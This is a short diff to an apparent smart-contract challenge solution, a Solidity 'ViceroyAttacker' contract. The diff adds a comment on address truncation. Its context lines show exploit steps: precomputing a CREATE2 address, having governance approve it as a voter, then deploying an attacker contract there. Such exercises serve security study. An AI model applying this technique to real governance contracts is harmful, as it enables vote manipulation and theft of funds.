@@ -83,7 +83,11 @@ contract ViceroyAttacker {
                     attackCounter,
                     keccak256(bytecode)
                 )
-            );
+            ); 
+
+            // bytes20 is capturing top (left) 20 bytes, while:
+            // uint160 is capturing lowest (right) 20 bytes.
+
             address deployedAddr = address(uint160(uint(hash)));
             governance.approveVoter(deployedAddr);
             new VoterAttacker{salt: bytes32(attackCounter)}(
